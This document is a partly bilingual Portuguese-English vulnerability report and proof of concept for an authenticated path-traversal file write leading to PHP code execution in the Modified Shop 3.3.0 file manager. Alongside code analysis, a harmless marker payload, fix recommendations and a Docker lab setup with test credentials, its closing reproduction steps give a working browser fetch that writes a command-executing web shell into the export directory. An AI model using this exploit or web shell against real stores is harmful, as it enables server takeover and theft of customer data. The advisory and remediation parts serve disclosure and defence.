# Authenticated Arbitrary File Upload leading to Remote Code Execution in Modified Shop File Manager

## Resumo

A vulnerability was identified in the Responsive Filemanager component integrated into Modified Shop 3.3.0 rev. 16825.

A funcionalidade `save_img`, disponível em: `/admin/includes/modules/filemanager/ajax_calls.php?action=save_img` permite que um usuário com sessão administrativa válida grave conteúdo arbitrário em arquivos no servidor.
The save_img functionality, available at /admin/includes/modules/filemanager/ajax_calls.php?action=save_img, allows a user with a valid administrative session to write arbitrary content to files on the server.

O parâmetro `name` é concatenado diretamente ao caminho físico, sem validação contra path traversal ou restrição de extensão. Embora o parâmetro `path` seja submetido à função `checkRelativePath()`, essa validação não é aplicada ao parâmetro `name`.
he `name` parameter is directly concatenated into the physical file path without validation against path traversal or extension restrictions. Although the `path` parameter is passed through the `checkRelativePath()` function, this validation is not applied to the `name` parameter.

Foi possível gravar um arquivo PHP fora do diretório de imagens, dentro de `/export/`, e acessá-lo por HTTP. O Apache interpretou o código PHP e retornou o marcador definido na PoC.
It was possible to write a PHP file outside the images directory, inside `/export/`, and access it over HTTP. Apache interpreted the PHP code and returned the marker defined in the PoC.


**Impact: Remote Code Execution (RCE) of PHP code in the context of the web server process user.**

## Identification

| Field | Description |
|---|---|
| Vulnerability | Arbitrary File Upload / Path Traversal leading to RCE |
| Component | Responsive Filemanager |
| Endpoint | `/admin/includes/modules/filemanager/ajax_calls.php` |
| Action | `save_img` |
| Method | POST |
| Relevant Parameters | `path`, `name`, `url` |
| Tested Version | Modified Shop 3.3.0 rev. 16825 |
| Authentication | Valid administrative session and RF session |
| Result | Confirmed RCE |
| CWE | CWE-434 // CWE-22 // CWE-94 |


## Technical Analysis

### 1. Session Control

The endpoint checks for the existence of the File Manager session identifier:

```php
if ($_SESSION['RF']["verify"] != "RESPONSIVEfilemanager") {
    response(trans('forbidden').AddErrorLocation())->send();
    exit;
}
```

Therefore, the demonstrated exploit requires a valid session with the RF context initialized.

### 2. Incomplete Path Validation

The code validates `$_POST['path']`:

```php
if(isset($_POST['path']) && !checkRelativePath($_POST['path'])) {
    response(trans('wrong path').AddErrorLocation())->send();
    exit;
}
```

However, equivalent validation is not applied to `$_POST['name']`.

The `checkRelativePath()` function identifies traversal sequences such as `../`, `./` and their encoded variants. However, its implementation does not protect the `name` parameter.

### 3. Lack of Effective Content and Extension Validation

In the `save_img` action, the code executes:

```php
$info = pathinfo($_POST['name']);
$image_data = $_POST['url'];

if (preg_match('/^data:image\/(\w+);base64,/', $image_data, $type)) {
    $image_data = substr($image_data, strpos($image_data, ',') + 1);
    $type = strtolower($type[1]);

    $image_data = base64_decode($image_data);
}
```

The regular expression checks only the Data URI prefix. It does not verify that the content represents a valid image or prevent the decoded content from containing PHP code.

Although `pathinfo()` is used, the resulting `$info` variable is not used to restrict the file extension.

### 4. Arbitrary File Write

The configuration defines:

```php
'current_path' => '../../../../images/',
```

However, the file-writing operation directly uses the supplied values:

```php
file_put_contents(
    $config['current_path'] . $_POST['path'] . $_POST['name'],
    $image_data
);
```

The `name` parameter can contain a relative directory traversal sequence, allowing the write operation to escape the configured upload directory.

## Proof of Concept (PoC)

### Request Used

Endpoint:

```http
POST /admin/includes/modules/filemanager/ajax_calls.php?action=save_img
Content-Type: application/x-www-form-urlencoded
```

Parameters:

```text
path=
name=../export/RS_FILEMANAGER_EXPORT_TEST33.php
url=data:image/png;base64,BASE64_DO_CONTEUDO
```

PHP Payload Used:

```php
<?php echo 'RS_FILEMANAGER_PHP_EXEC'; ?>
```

### PoC with JavaScript Fetch

Execute in the browser console with an authenticated administrative session and the File Manager initialized:

```javascript
(async () => {
  const endpoint =
    "/admin/includes/modules/filemanager/ajax_calls.php?action=save_img";

  const php = "<?php echo 'RS_FILEMANAGER_PHP_EXEC'; ?>";

  const body = new URLSearchParams({
    path: "",
    name: "../export/RS_FILEMANAGER_EXPORT_TEST33.php",
    url: "data:image/png;base64," + btoa(php)
  });

  const response = await fetch(endpoint, {
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded"
    },
    body,
    credentials: "same-origin",
    cache: "no-store"
  });

  console.log({
    status: response.status,
    response: await response.text()
  });
})();
```

### File Write Evidence

The file was found at the following path:

```text
/var/www/html/export/RS_FILEMANAGER_EXPORT_TEST33.php
```

Result:

```text
-rw-r--r-- 1 www-data www-data 40 Nov 5 18:02 RS_FILEMANAGER_EXPORT_TEST33.php
```

Content:

```php
<?php echo 'RS_FILEMANAGER_PHP_EXEC'; ?>
```

### Remote Code Execution Evidence

Request Performed:

```bash
curl -i --max-time 10 \
  http://127.0.0.1/export/RS_FILEMANAGER_EXPORT_TEST33.php
```

Response:

```http
HTTP/1.1 200 OK
Server: Apache/2.4.65 (Debian)
X-Powered-By: PHP/8.1.34
Content-Type: text/html; charset=UTF-8

RS_FILEMANAGER_PHP_EXEC
```

The PHP content was interpreted by the server rather than being delivered as source code.

The successful execution of the marker confirms the ability to execute arbitrary PHP code written through the vulnerable functionality.

## Impact

A user able to access the File Manager with a valid administrative session may write PHP files to directories accessible by the web server.

Potential consequences include:

- Remote Code Execution (RCE) through PHP.
- Compromise of the application and data accessible to the web server user.
- Reading and modifying files according to the PHP process permissions.
- Installation of persistent backdoors.
- Compromise of other components hosted in the same environment, depending on permissions and isolation mechanisms.

The PoC demonstrated PHP execution in the context of the web server. Execution of operating system commands was not required to confirm the vulnerability.

## Recommendations

1. Apply security validation to both `path` and `name`.
2. Reject filenames containing directory separators or path traversal sequences.
3. Restrict permitted extensions to an explicit allowlist of image formats.
4. Validate the actual image content, preferably by decoding and recreating the image on the server.
5. Use absolute paths and validate the final destination with `realpath()`, ensuring it remains within the authorized directory.
6. Disable PHP execution in directories intended for user-uploaded files.
7. Review the web server user's write permissions and restrict access to the File Manager.
8. Implement CSRF protection and verify authorization for every request.

1. Aplicar validação de segurança tanto em `path` quanto em `name`.
2. Rejeitar nomes contendo separadores de diretório e sequências de traversal.
3. Restringir as extensões permitidas a uma lista explícita de formatos de imagem.
4. Validar o conteúdo real da imagem, preferencialmente decodificando e recriando a imagem no servidor.
5. Utilizar caminhos absolutos e validar o destino final com `realpath()`, garantindo que permaneça dentro do diretório autorizado.
6. Impedir a execução de PHP em diretórios destinados a arquivos enviados por usuários.
7. Revisar permissões de escrita do usuário do servidor web e limitar o acesso ao File Manager.
8. Implementar proteção CSRF e verificar a autorização da operação em cada requisição.

## Classification

- CWE-434 — Unrestricted Upload of File with Dangerous Type.
- CWE-22 — Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal').
- CWE-94 — Improper Control of Generation of Code ('Code Injection').

## Conclusion

The vulnerability was confirmed through static code analysis and dynamic exploitation in Modified Shop 3.3.0 rev. 16825.

The `save_img` functionality allows PHP content to be written outside the configured upload directory through manipulation of the `name` parameter. The resulting file is accessible over HTTP and executed by Apache's PHP interpreter.

**Status: Confirmed — Arbitrary File Upload + Path Traversal leading to Remote Code Execution (RCE).**

The demonstrated exploitation requires a valid administrative session with the File Manager initialized.


## Deploy Enviroment
### Update and Upgrade Linnux host
```
sudo apt update && sudo apt upgrade -y
```

### Install Docker and Docker Compose
```
sudo apt install -y docker.io docker-compose
```

### Create Folder and Navigate to Directory
```
mkdir modified-shop-web && cd modified-shop-web
```

### Download Docker File
```
wget https://raw.githubusercontent.com/smithbraz/PoC-Modified-Shop/refs/heads/main/docker-compose.yml
```

### Create Config File
```
mkdir config
```
```
nano config/configure.php
```
```
<?php
define('HTTP_SERVER', 'http://IP_Address:8080');
define('HTTPS_SERVER', 'http://IP_Address:8080');

include_once dirname(__DIR__) . '/configure.php';

```

### Deploy WebApp
```
sudo docker compose up
```
or 
```
sudo docker compose up -d
```

## Credentials:
```
email: admin@redscan.local
Password: RedScan@2026!
```


## Steps to reproduce

### Access you web browser and provide login in the web application

http://192.168.1.193:8080




```
(async () => {
  const r = await fetch(
    "/admin/includes/modules/filemanager/dialog.php",
    {
      credentials: "same-origin",
      cache: "no-store"
    }
  );

  console.log({
    status: r.status,
    body: (await r.text()).slice(0, 120)
  });
})();
```

```
fetch('/admin/includes/modules/filemanager/ajax_calls.php?action=save_img', {
  method: 'POST',
  headers: {'Content-Type':'application/x-www-form-urlencoded'},
  body: new URLSearchParams({
    path: '',
    name: '../export/shell.php',
    url: 'data:image/png;base64,' + btoa("<?php echo shell_exec($_GET['cmd']); ?>")
  })
}).then(async r => console.log('HTTP', r.status, await r.text()))
```
